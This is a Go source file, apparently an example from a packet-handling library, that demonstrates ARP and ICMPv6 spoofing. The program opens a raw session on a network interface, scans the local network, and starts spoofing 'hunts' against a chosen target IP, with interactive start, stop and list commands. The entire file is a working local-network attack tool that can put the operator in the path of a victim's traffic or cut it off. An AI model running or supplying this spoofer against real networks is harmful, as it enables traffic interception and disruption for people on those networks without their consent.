package main

import (
	"bytes"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/irai/packet"
	"github.com/irai/packet/arp"
	"github.com/irai/packet/icmp"
)

// Simple utility to demonstrate use of ARP spoofing
var (
	nic   = flag.String("i", "eth0", "nic interface")
	ipstr = flag.String("ip", "", "target ip address as in 192.168.0.30")
	debug = flag.Bool("d", false, "set to true to show debug messages")
)

func processNotification(s *packet.Session, targetIP net.IP) {
	for {
		notification, ok := <-s.C
		if !ok { // terminate when channel closed
			return
		}
		switch notification.Online {
		case true:
			if !notification.Addr.IP.Equal(targetIP) {
				fmt.Printf("host is online: %s\n", notification)
				continue
			}
			fmt.Println("target ip is online", targetIP)
			if _, err := arpSpoofer.StartHunt(notification.Addr); err != nil {
				fmt.Println("error in start arp hunt", err)
				return
			}

		default:
			if !notification.Addr.IP.Equal(targetIP) {
				fmt.Printf("host is offline: %s\n", notification)
				continue
			}
			fmt.Println("target ip is offline", targetIP)
			if _, err := arpSpoofer.StopHunt(notification.Addr); err != nil {
				fmt.Println("error in stop arp hunt", err)
				return
			}
		}
		s.PrintTable()
	}
}

var (
	arpSpoofer   *arp.Handler
	icmp6Spoofer *icmp.Handler6
)

func main() {
	var err error
	var targetIP net.IP
	var exiting bool

	flag.Parse()

	fmt.Println("setting up nic: ", *nic)
	s, err := packet.NewSession(*nic)
	if err != nil {
		fmt.Printf("conn error: %s", err)
		return
	}
	defer s.Close()

	arp.Debug = *debug
	icmp.Debug = *debug
	packet.Debug = *debug

	// instanciate the arp spoofer
	arpSpoofer, err = arp.New(s)
	if err != nil {
		fmt.Println("error creating arp spoofer", err)
		return
	}
	defer arpSpoofer.Close()

	// instanciate the icmp6 spoofer
	icmp6Spoofer, err = icmp.New6(s)
	if err != nil {
		fmt.Println("error creating arp spoofer", err)
		return
	}
	defer icmp6Spoofer.Close()

	// start goroutine to process notifications
	targetIP = net.ParseIP(*ipstr)
	go processNotification(s, targetIP)

	// start packet processing goroutine
	go func() {
		buffer := make([]byte, packet.EthMaxSize)
		for {
			n, _, err := s.ReadFrom(buffer)
			if err != nil {
				if !exiting {
					fmt.Println("error reading packet", err)
				}
				return
			}

			// Ignore packets sent by us
			if bytes.Equal(packet.SrcMAC(buffer[:n]), s.NICInfo.HostAddr4.MAC) {
				continue
			}

			frame, err := s.Parse(buffer[:n])
			if err != nil {
				fmt.Println("parse error", err)
				continue
			}

			switch frame.PayloadID {
			case packet.PayloadARP:
				// Process arp packets
				if err := arpSpoofer.ProcessPacket(frame); err != nil {
					fmt.Println("error processing arp packet", err)
				}
			case packet.PayloadICMP6:
				// Process icmpv6 packets
				if err := icmp6Spoofer.ProcessPacket(frame); err != nil {
					fmt.Println("error processing icmp6 packet", err)
				}
			}

			s.Notify(frame)
		}
	}()

	// if not ip given, just listen...
	if targetIP == nil {
		fmt.Println("missing or invalid target ip address...listening only", err)
		time.Sleep(time.Hour * 24) // wait forever!!!
	}

	// send arp scan
	s.ARPScan()

	// Start icmpv6 spoofer module
	icmp6Spoofer.Start()

	// start goroutine to read command line
	inputChan := make(chan []string)
	go func() {
		for {
			fmt.Println("\n----")
			fmt.Print("Enter command: ")
			inputChan <- readInput()
		}
	}()

	// terminate cleanly when we get ctrl-C or sigterm
	c := make(chan os.Signal, 2)
	signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)
	for {

		select {
		case sig := <-c:
			switch sig {
			case syscall.SIGINT, syscall.SIGTERM:
				exiting = true
				arpSpoofer.Close()
				icmp6Spoofer.Close()
				s.Close()
				time.Sleep(time.Second)
				return
			}

		case tokens := <-inputChan:
			switch tokens[0] {
			case "l", "list":
				fmt.Println("hosts table ---")
				s.PrintTable()

			case "log":
				p := getString(tokens, 1)
				switch p {
				case "packet":
					packet.Debug = !packet.Debug
				case "arp":
					arp.Debug = !arp.Debug
				case "icmp":
					icmp.Debug = !icmp.Debug
				}

			case "start":
				ip := getIP(tokens, 1)
				if ip == nil {
					continue
				}
				if host := s.FindIP(ip); host != nil {
					if host.Addr.IP.To4() != nil {
						_, err = arpSpoofer.StartHunt(host.Addr)
					} else {
						_, err = icmp6Spoofer.StartHunt(host.Addr)
					}
				}

			case "stop":
				ip := getIP(tokens, 1)
				if ip == nil {
					continue
				}
				if host := s.FindIP(ip); host != nil {
					if host.Addr.IP.To4() != nil {
						_, err = arpSpoofer.StopHunt(host.Addr)
					} else {
						_, err = icmp6Spoofer.StopHunt(host.Addr)
					}
				}

			case "q":
				c <- syscall.SIGINT

			default:
				fmt.Println("")
				fmt.Println("change log level:   log packet|arp|icmp")
				fmt.Println("list hosts      :   l|list")
				fmt.Println("quit            :   q")
			}
			if err != nil {
				fmt.Printf("error in operation %s: %v\n", tokens[0], err)
			}
		}
	}
}
